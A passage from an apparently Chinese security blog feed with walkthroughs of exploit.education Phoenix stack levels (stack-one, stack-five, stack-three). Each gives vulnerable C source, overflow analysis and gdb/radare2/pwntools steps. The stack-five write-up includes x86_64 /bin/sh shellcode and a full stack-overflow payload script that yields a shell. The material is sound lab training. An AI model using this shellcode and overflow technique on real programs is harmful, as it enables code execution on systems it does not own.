class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BANNER \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;Welcome to &quot;</span> LEVELNAME <span class="string">&quot;, brought to you by https://exploit.education&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> changeme;</span><br><span class="line">  &#125; locals;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, BANNER);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">&quot;specify an argument, to be copied into the \&quot;buffer\&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  locals.changeme = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(locals.buffer, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locals.changeme == <span class="number">0x496c5962</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well done, you have successfully set changeme to the correct value&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n&quot;</span>,</span><br><span class="line">        locals.changeme);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>危险的<code>strcpy()</code>。结构体中的<code>changeme</code>变量会在进行<code>strcpy</code>时被溢出覆盖。记得<code>stack-zero</code>的目的，是改变<code>changeme</code>的值就会通过，但这个关卡要求我们必须将<code>changeme</code>改变成<code>0x496c5962</code>才行。<br>结构体<code>locals</code>包含两个成员，与<code>stack-zero</code>相同。64个字符+1个int。</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>首先，<code>strcpy</code>是从<code>argv[1]</code>中获取的输入，所以如果我们直接将输出传给<code>stack-one</code>，会出错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">&quot;print &#x27;A&#x27;*65&quot;</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">user@phoenix-amd64:~$ python -c <span class="string">&quot;print &#x27;A&#x27;*65&quot;</span> | /opt/phoenix/amd64/stack-one </span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">stack-one: specify an argument, to be copied into the <span class="string">&quot;buffer&quot;</span></span><br><span class="line">close failed <span class="keyword">in</span> file object destructor:</span><br><span class="line">sys.excepthook is missing</span><br><span class="line">lost sys.stderr</span><br></pre></td></tr></table></figure>

<p>解决办法是用<code>xargs</code>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">&quot;print &#x27;A&#x27;*65&quot;</span> | xargs /opt/phoenix/amd64/stack-one </span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Getting closer! changeme is currently 0x00000041, we want 0x496c5962</span><br></pre></td></tr></table></figure>

<p>可以看到，我们将<code>changeme</code>改变为了<code>0x41</code>，即字符<code>A</code>。<br>接下来就简单了，只要构造<code>0x496c5962</code>就可以。<br>使用<code>pwntools</code>的<code>p32/p64</code>即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c <span class="string">&quot;import pwn;print &#x27;A&#x27;*64+pwn.p64(0x496c5962)&quot;</span> | xargs /opt/phoenix/amd64/stack-one </span><br><span class="line">xargs: WARNING: a NUL character occurred <span class="keyword">in</span> the input.  It cannot be passed through <span class="keyword">in</span> the argument list.  Did you mean to use the --null option?</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well <span class="keyword">done</span>, you have successfully <span class="built_in">set</span> changeme to the correct value</span><br></pre></td></tr></table></figure>

<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pwn;print &#x27;A&#x27;*64+pwn.p64(0x496c5962)&quot;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI\x00\x00\x00\x00</span><br><span class="line">user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-one</span><br><span class="line">gef➤  run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Starting program: /opt/phoenix/amd64/stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">[Inferior 1 (process 9358) exited normally]</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  set args AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">gef➤  run</span><br><span class="line">Starting program: /opt/phoenix/amd64/stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI</span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">[Inferior 1 (process 9363) exited normally]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ r2 /opt/phoenix/amd64/stack-one </span><br><span class="line"><span class="meta prompt_">[0x00400500]&gt; </span><span class="language-bash">ood `!python -c <span class="string">&quot;import pwn;print &#x27;A&#x27;*64+pwn.p32(0x496c5962)&quot;</span>`</span></span><br><span class="line">Process with PID 9383 started...</span><br><span class="line">File dbg:///opt/phoenix/amd64/stack-one  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI reopened in read-only mode</span><br><span class="line">= attach 9383 9383</span><br><span class="line">Assuming filepath /opt/phoenix/amd64/stack-one</span><br><span class="line"><span class="meta prompt_">[0x7ffff7dc5d34]&gt; </span><span class="language-bash">dc</span></span><br><span class="line">Welcome to phoenix/stack-one, brought to you by https://exploit.education</span><br><span class="line">Well done, you have successfully set changeme to the correct value</span><br><span class="line">PTRACE_EVENT_EXIT pid=9383, status=0x0</span><br><span class="line">= attach 9383 1</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的<code>pwntools</code>好用的很，相比gdb，radare2的用法好像更灵活。以后尽可能用两种工具都实操一下。</p>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ExploitEducation</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit.education/stack-five</title>
    <url>/re/pwn/exploit-education-stack-five.html</url>
    <content><![CDATA[<p>初次体验基于栈溢出的PWN！</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-five, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Can you execve(&quot;/bin/sh&quot;, ...) ?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * What is green and goes to summer camp? A brussel scout.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BANNER \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;Welcome to &quot;</span> LEVELNAME <span class="string">&quot;, brought to you by https://exploit.education&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">start_level</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, BANNER);</span><br><span class="line">  start_level();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>与<code>stack-four</code>基本一样，只不过<code>buffer</code>大了一些。<br>过这个关卡，不是要执行到<code>complete_level</code>函数了，而是要<code>get shell</code>。也就是通过溢出漏洞，来执行我们自己的程序，即<code>shellcode</code>。</p>
<p><code>shellcode</code>就是一段执行返回一个shell的汇编代码。</p>
<p>我们将<code>shellcode</code>写到栈中，再通过溢出控制<code>RIP</code>，让程序去执行我们在栈中写好的<code>shellcode</code>，从而拿到<code>shell</code>。</p>
<p>所以，在栈中基本上是这样的：</p>
<p>image-20190411231630801.png<br><img src="/images/pasted-11.png" alt="upload successful"></p>
<p>为了让我们的<code>shellcode</code>顺利执行，<code>nopsled</code>最好要有，因为有比如环境变量等的影响，栈中的地址会出现小幅度的偏移。</p>
<p>那我们生成<code>payload</code>的脚本也就有了初步的样子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = ???? <span class="comment"># &lt;===这个大小不知道</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span> <span class="comment"># 这是一个x86_64的/bin/sh程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret_addr = ??????? # &lt;===这个地址目前还不知道</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">buffer += <span class="string">&quot;\x90&quot;</span> * <span class="number">70</span></span><br><span class="line">buffer += shellcode</span><br><span class="line">buffer += <span class="string">&quot;\x90&quot;</span> * (offset - <span class="built_in">len</span>(buffer))</span><br><span class="line">buffer += p64(ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> buffer</span><br></pre></td></tr></table></figure>

<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先来看下二进制文件信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ checksec /opt/phoenix/amd64/stack-five </span><br><span class="line">[*] &#x27;/opt/phoenix/amd64/stack-five&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    RPATH:    &#x27;/opt/phoenix/x86_64-linux-musl/lib&#x27;</span><br></pre></td></tr></table></figure>
<p>没有保护措施，可以直接写地址跳转。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ gdb -q /opt/phoenix/amd64/stack-five </span><br><span class="line">Reading symbols from /opt/phoenix/amd64/stack-five...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004005a4 &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x00000000004005a5 &lt;+1&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x00000000004005a8 &lt;+4&gt;:	sub    $0x10,%rsp</span><br><span class="line">   0x00000000004005ac &lt;+8&gt;:	mov    %edi,-0x4(%rbp)</span><br><span class="line">   0x00000000004005af &lt;+11&gt;:	mov    %rsi,-0x10(%rbp)</span><br><span class="line">   0x00000000004005b3 &lt;+15&gt;:	mov    $0x400620,%edi</span><br><span class="line">   0x00000000004005b8 &lt;+20&gt;:	callq  0x400400 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004005bd &lt;+25&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x00000000004005c2 &lt;+30&gt;:	callq  0x40058d &lt;start_level&gt;</span><br><span class="line">   0x00000000004005c7 &lt;+35&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x00000000004005cc &lt;+40&gt;:	leaveq </span><br><span class="line">   0x00000000004005cd &lt;+41&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disassemble start_level </span><br><span class="line">Dump of assembler code for function start_level:</span><br><span class="line">   0x000000000040058d &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x000000000040058e &lt;+1&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x0000000000400591 &lt;+4&gt;:	add    $0xffffffffffffff80,%rsp</span><br><span class="line">   0x0000000000400595 &lt;+8&gt;:	lea    -0x80(%rbp),%rax</span><br><span class="line">   0x0000000000400599 &lt;+12&gt;:	mov    %rax,%rdi</span><br><span class="line">   0x000000000040059c &lt;+15&gt;:	callq  0x4003f0 &lt;gets@plt&gt;</span><br><span class="line">   0x00000000004005a1 &lt;+20&gt;:	nop</span><br><span class="line">   0x00000000004005a2 &lt;+21&gt;:	leaveq </span><br><span class="line">   0x00000000004005a3 &lt;+22&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(gdb) break *0x00000000004005a1</span><br><span class="line">Breakpoint 1 at 0x4005a1</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/phoenix/amd64/stack-five </span><br><span class="line">Welcome to phoenix/stack-five, brought to you by https://exploit.education</span><br><span class="line">AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005a1 in start_level ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(gdb) x/64xw $rsp</span><br><span class="line">0x7fffffffe5a0:	0x41414141	0x00000000	0x00400620	0x00000000</span><br><span class="line">0x7fffffffe5b0:	0x004005a4	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x7fffffffe5c0:	0x00000000	0x00000000	0xf7db6dde	0x00007fff</span><br><span class="line">0x7fffffffe5d0:	0x004005a4	0x00000000	0x00b90035	0x03fb0686</span><br><span class="line">0x7fffffffe5e0:	0x00000000	0x00000000	0xf7db6b1e	0x00007fff</span><br><span class="line">0x7fffffffe5f0:	0xf7ffb300	0x00007fff	0x00000000	0x0a000000</span><br><span class="line">0x7fffffffe600:	0xf7ffb300	0x00007fff	0xf7db9934	0x00007fff</span><br><span class="line">0x7fffffffe610:	0xffffe698	0x00007fff	0xffffe640	0x00007fff</span><br><span class="line">0x7fffffffe620:	0xffffe640	0x00007fff	0x004005c7	0x00000000</span><br><span class="line">0x7fffffffe630:	0xffffe698	0x00007fff	0x00000000	0x00000001</span><br><span class="line">0x7fffffffe640:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff</span><br><span class="line">0x7fffffffe650:	0x00000000	0x00000000	0xffffe690	0x00007fff</span><br><span class="line">0x7fffffffe660:	0x00000000	0x00000000	0xf7ffdbc8	0x00007fff</span><br><span class="line">0x7fffffffe670:	0x00003e00	0x04000001	0x00400459	0x00000000</span><br><span class="line">0x7fffffffe680:	0x00000000	0x00000000	0x00400436	0x00000000</span><br><span class="line">0x7fffffffe690:	0x00000001	0x00000000	0xffffe894	0x00007fff</span><br></pre></td></tr></table></figure>
<p>我们先看了一下<code>main</code>函数与<code>start_level</code>函数的汇编代码，并在程序获取用户输入(<code>gets</code>)函数后下断点。</p>
<p>然后运行程序，并给入<code>AAAA</code>的输入，回车后程序遇到我们的断点停下来，再查看一下栈中的情况。</p>
<p>之前说到，<code>call</code>调用的时候，会将返回地址压栈，所以我们要在栈中找到<code>call</code>下一条命令的地址，即<code>0x04005c7</code>。</p>
<p>通过查看栈，可以发现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">offset = 0x7fffffffe628 - 0x7fffffffe5a0 = 136</span><br><span class="line">rsp = 0x7fffffffe5a0</span><br></pre></td></tr></table></figure>

<p>所以我们只需将<code>RIP</code>这个返回地址写成<code>rsp</code>的地址，程序就会跳到我们的<code>nopsled</code>中去，然后执行<code>shellcode</code>。</p>
<p>完美一下我们生成<code>payload</code>的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">136</span> </span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span> <span class="comment"># 这是一个x86_64的/bin/sh程序</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x7fffffffe5a0</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">buffer += <span class="string">&quot;\x90&quot;</span> * <span class="number">70</span></span><br><span class="line">buffer += shellcode</span><br><span class="line">buffer += <span class="string">&quot;\x90&quot;</span> * (offset - <span class="built_in">len</span>(buffer))</span><br><span class="line">buffer += p64(ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> buffer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿<code>shell</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python exp5.py &gt; five2</span><br><span class="line">user@phoenix-amd64:~$ cat five2 | /opt/phoenix/amd64/stack-five </span><br><span class="line">Welcome to phoenix/stack-five, brought to you by https://exploit.education</span><br><span class="line">user@phoenix-amd64:~$ cat five2 - | /opt/phoenix/amd64/stack-five </span><br><span class="line">Welcome to phoenix/stack-five, brought to you by https://exploit.education</span><br><span class="line">id</span><br><span class="line">uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user)</span><br><span class="line">whoami</span><br><span class="line">phoenix-amd64-stack-five</span><br><span class="line">^C</span><br><span class="line">user@phoenix-amd64:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>值得注意的是，在这里直接<code>cat five2 | /xxxxxx/stack-five</code>是不能成功的，因为<code>/bin/sh</code>需要输入，而<code>cat</code>命令在输出完我们的<code>payload</code>之后就会关闭输入，导致<code>/bin/sh</code>也退出了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><code>nopsled</code>比较关键，太小的时候，会使得<code>shellcode</code>执行不完整，出现<code>Program received signal SIGILL, Illegal instruction.</code>的错误提示。</li>
<li>用<code>r2</code>实操的部分晚些时候再发上来。得赶紧睡觉了。</li>
</ol>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ExploitEducation</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit.education/stack-three</title>
    <url>/re/pwn/exploit-education-stack-three.html</url>
    <content><![CDATA[<blockquote>
<p>stack-two基本上于stack-one一样，只不过需要设置一个环境变量，程序是从环境变量中获取的值。</p>
</blockquote>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-three, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The aim is to change the contents of the changeme variable to 0x0d0a090a</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When does a joke become a dad joke?</span></span><br><span class="line"><span class="comment"> *   When it becomes apparent.</span></span><br><span class="line"><span class="comment"> *   When it&#x27;s fully groan up.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BANNER \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;Welcome to &quot;</span> LEVELNAME <span class="string">&quot;, brought to you by https://exploit.education&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">complete_level</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you&#x27;ve finished &quot;</span> LEVELNAME <span class="string">&quot; :-) Well done!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="title function_">int</span> <span class="params">(*fp)</span><span class="params">()</span>;</span><br><span class="line">  &#125; locals;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, BANNER);</span><br><span class="line"></span><br><span class="line">  locals.fp = <span class="literal">NULL</span>;</span><br><span class="line">  gets(locals.buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locals.fp) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;calling function pointer @ %p\n&quot;</span>, locals.fp);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    locals.fp();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function pointer remains unmodified :~( better luck next time!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>main</code>函数中并没有调用<code>complete_level</code>函数的地方，要完成这个关卡，需要想办法调用这个函数。<br>在<code>main</code>函数中，可通过溢出<code>gets</code>函数，覆盖<code>local.fp</code>指针，将fp的值改变为<code>complate_level</code>函数的地址，就完成了。</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先查看一下二进制文件的信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ checksec ./stack-three </span><br><span class="line">[*] &#x27;/opt/phoenix/amd64/stack-three&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    RPATH:    &#x27;/opt/phoenix/x86_64-linux-musl/lib&#x27;</span><br></pre></td></tr></table></figure>
<p>我们发现<code>No RELRO</code>，也就是没有地址重定位。<br>通过<code>ldd</code>命令也可以查看是否开启了地址重定位：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ ldd stack-three </span><br><span class="line">	linux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class="line">	libc.so =&gt; /opt/phoenix/x86_64-linux-musl/lib/libc.so (0x00007ffff7b45000)</span><br><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ ldd stack-three </span><br><span class="line">	linux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class="line">	libc.so =&gt; /opt/phoenix/x86_64-linux-musl/lib/libc.so (0x00007ffff7b45000)</span><br><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ ldd stack-three </span><br><span class="line">	linux-vdso.so.1 (0x00007ffff7ffa000)</span><br><span class="line">	libc.so =&gt; /opt/phoenix/x86_64-linux-musl/lib/libc.so (0x00007ffff7b45000)</span><br></pre></td></tr></table></figure>
<p>我们发现<code>libc.so</code>的地址没有变化。</p>
<p>然后就要找一下<code>complete_level</code>函数的地址，可以通过r2&#x2F;objdump工具：<br>首先使用<code>objdump</code>命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ objdump -t ./stack-three | grep complete_level</span><br><span class="line">000000000040069d g     F .text	0000000000000018 complete_level</span><br></pre></td></tr></table></figure>

<p>使用radare2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ r2 stack-three </span><br><span class="line"><span class="meta prompt_">[0x00400530]&gt; </span><span class="language-bash">aaa</span></span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[ ] [*] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan))</span><br><span class="line"><span class="meta prompt_">[0x00400530]&gt; </span><span class="language-bash">afl~complete_level</span></span><br><span class="line">0x0040069d    1 24           sym.complete_level</span><br><span class="line"><span class="meta prompt_">[0x00400530]&gt; </span></span><br></pre></td></tr></table></figure>

<p>所以，我们要将fp覆盖为<code>0x0040069d</code>。那接下来的就简单了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ python -c &quot;from pwn import *;print &#x27;A&#x27;*64+p64(0x0040069d)&quot; | ./stack-three </span><br><span class="line">Welcome to phoenix/stack-three, brought to you by https://exploit.education</span><br><span class="line">calling function pointer @ 0x40069d</span><br><span class="line">Congratulations, you&#x27;ve finished phoenix/stack-three :-) Well done!</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>checksec 查看二进制信息</li>
<li>objdump 查找符号表信息</li>
<li>r2 afl命令。(analyze function list)</li>
</ul>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ExploitEducation</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit wiki——如何开始写一个exp</title>
    <url>/pentest/metasploit%20wiki%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E5%BC%80%E5%A7%8B%E5%86%99%E4%B8%80%E4%B8%AAexp.html</url>
